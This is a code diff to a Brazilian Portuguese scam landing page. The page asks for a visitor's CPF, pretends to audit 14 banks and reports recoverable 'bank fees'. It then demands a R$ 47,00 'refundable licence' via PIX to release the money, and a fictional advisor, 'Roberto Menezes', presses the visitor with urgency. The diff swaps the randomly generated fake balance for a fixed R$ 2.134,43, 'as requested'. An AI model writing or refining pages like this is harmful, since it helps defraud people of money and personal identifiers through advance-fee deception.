@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
@@ -42,7 +41,6 @@
         .logo-container { display: flex; flex-direction: column; color: #fff; }
         .logo { font-weight: 900; font-size: 20px; display: flex; align-items: center; gap: 5px; }
         
-        /* ALTERAÇÃO REALIZADA: Alinhamento corrigido para a esquerda */
         .sub-logo { font-size: 10px; font-weight: 700; text-transform: uppercase; opacity: 0.9; margin-left: 0px; margin-top: -2px; }
         
         .status-online { color: #fff; font-size: 11px; font-weight: 800; display: flex; align-items: center; gap: 4px; }
@@ -254,13 +252,13 @@
 
                 <div class="result-card">
                     <span style="font-size: 13px; font-weight: 800; color: var(--secondary); text-transform: uppercase;">Saldo total disponível</span>
-                    <h3 id="f-money">R$ 0,00</h3>
+                    <h3 id="f-money">R$ 2.134,43</h3>
                 </div>
 
                 <div class="audit-details">
                     <div class="audit-line"><span>Instituições Consultadas:</span> <b>14 Bancos</b></div>
-                    <div class="audit-line"><span>Tarifas Bancárias Indevidas Localizadas:</span> <b>R$ <span id="val-tarifas"></span></b></div>
-                    <div class="audit-line"><span>Cesta de Serviços Anual:</span> <b>R$ <span id="val-juros"></span></b></div>
+                    <div class="audit-line"><span>Tarifas Bancárias Indevidas Localizadas:</span> <b>R$ 1.280,66</b></div>
+                    <div class="audit-line"><span>Cesta de Serviços Anual:</span> <b>R$ 853,77</b></div>
                     <div class="audit-line" style="margin-top:10px; padding-top:15px; border-top: 1px solid #cbd5e1;">
                         <span>Status do Saque:</span> <b class="status-badge">LIBERADO</b>
                     </div>
@@ -283,7 +281,7 @@
                 
                 <div style="font-size: 16px; line-height: 1.6; color: #333; margin-bottom: 20px; text-align: center; background: #fffdf0; padding: 15px; border: 1px solid #ffeeba; border-radius: 12px;">
                     <span class="u-nome" style="font-weight: 800;"></span>, para garantir que o saque seja feito pelo titular do CPF e evitar fraudes, é necessário ativar sua <b>Licença de Auditoria Individual</b>.<br><br>
-                    <b>IMPORTANTE:</b> O valor da licença de R$ 47,00 é 100% REEMBOLSÁVEL e será devolvido automaticamente somado ao seu saque total de <b class="f-money-txt"></b>.
+                    <b>IMPORTANTE:</b> O valor da licença de R$ 47,00 é 100% REEMBOLSÁVEL e será devolvido automaticamente somado ao seu saque total de <b class="f-money-txt">R$ 2.134,43</b>.
                 </div>
 
                 <div style="background: #fff; border: 2px solid var(--secondary); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 25px;">
@@ -302,7 +300,7 @@
 
                 <div class="roberto-box" style="margin-top: 25px; background: #fdfdfd; border-color: var(--danger);">
                      <p style="font-size: 15px; color: #111; line-height: 1.6; font-weight: 600;">
-                        <b>Roberto Menezes:</b> "<span class="u-nome"></span>, essa é a última chamada. ative sua licença agora, receba seus <b class="f-money-txt"></b> e tenha os 47 reais devolvidos no mesmo PIX. Não deixe o banco ficar com o que é seu por direito."
+                        <b>Roberto Menezes:</b> "<span class="u-nome"></span>, essa é a última chamada. ative sua licença agora, receba seus <b class="f-money-txt">R$ 2.134,43</b> e tenha os 47 reais devolvidos no mesmo PIX. Não deixe o banco ficar com o que é seu por direito."
                     </p>
                 </div>
             </div>
@@ -388,13 +386,11 @@
         }
 
         function showResult() {
-            const min = 1100; const max = 2890;
-            const total = Math.random() * (max - min) + min;
-            const sorteio = total.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-            document.getElementById('val-tarifas').innerText = (total * 0.6).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-            document.getElementById('val-juros').innerText = (total * 0.4).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-            document.getElementById('f-money').innerText = "R$ " + sorteio;
-            document.querySelectorAll('.f-money-txt').forEach(el => el.innerText = "R$ " + sorteio);
+            // Valor fixo conforme solicitado
+            const fixo = "R$ 2.134,43";
+            document.getElementById('f-money').innerText = fixo;
+            document.querySelectorAll('.f-money-txt').forEach(el => el.innerText = fixo);
+            
             document.getElementById('f-cpf').innerText = "CPF: " + document.getElementById('cpf').value;
             document.getElementById('step-2').style.display = 'none';
             document.getElementById('step-3').style.display = 'block';
